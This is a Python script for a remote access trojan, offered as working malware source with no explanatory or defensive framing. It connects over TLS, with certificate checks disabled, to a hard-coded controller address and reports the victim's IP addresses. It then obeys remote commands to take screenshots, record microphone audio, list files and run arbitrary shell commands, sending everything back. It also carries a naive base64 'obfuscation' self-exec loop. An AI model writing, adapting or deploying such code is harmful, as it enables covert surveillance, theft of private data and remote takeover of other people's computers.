import socket
import subprocess
import os
import pyautogui
import pyaudio
import wave
import requests
import ssl
import base64

def get_private_ip():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect(("8.8.8.8", 80))
        ip = sock.getsockname()[0]
        sock.close()
        return ip
    except socket.error:
        return None

def get_public_ip():
    try:
        ip = requests.get('https://api.ipify.org').text
        return ip
    except requests.RequestException:
        return None

def record_audio(filename):
    chunk = 1024
    format = pyaudio.paInt16
    channels = 1
    rate = 44100
    record_seconds = 10

    p = pyaudio.PyAudio()
    stream = p.open(format=format, channels=channels, rate=rate, input=True, frames_per_buffer=chunk)
    
    frames = []
    for _ in range(0, int(rate / chunk * record_seconds)):
        data = stream.read(chunk)
        frames.append(data)
    
    stream.stop_stream()
    stream.close()
    p.terminate()
    
    wf = wave.open(filename, 'wb')
    wf.setnchannels(channels)
    wf.setsampwidth(p.get_sample_size(format))
    wf.setframerate(rate)
    wf.writeframes(b''.join(frames))
    wf.close()

def capture_screenshot(filename):
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)

def list_files(directory):
    return os.listdir(directory)

def connect():
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s = context.wrap_socket(s, server_hostname='victim')

    s.connect(('192.168.0.110', 443))

    private_ip = get_private_ip()
    public_ip = get_public_ip()
    s.send(f'Private IP: {private_ip}, Public IP: {public_ip}\n'.encode())

    while True:
        command = s.recv(1024).decode()
        
        if command == 'exit':
            break
        elif command == 'screenshot':
            capture_screenshot('screenshot.png')
            with open('screenshot.png', 'rb') as f:
                s.sendall(f.read())
        elif command.startswith('list '):
            directory = command.split(' ')[1]
            files = list_files(directory)
            s.send('\n'.join(files).encode())
        elif command == 'record_audio':
            record_audio('audio_capture.wav')
            with open('audio_capture.wav', 'rb') as f:
                s.sendall(f.read())
        else:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output = process.stdout.read() + process.stderr.read()
            s.send(output)
    
    s.close()

def obfuscate_and_run():
    encoded_script = base64.b64encode(open(__file__, 'rb').read()).decode()
    exec(base64.b64decode(encoded_script))

while True:
    try:
        obfuscate_and_run()
    except:
        continue
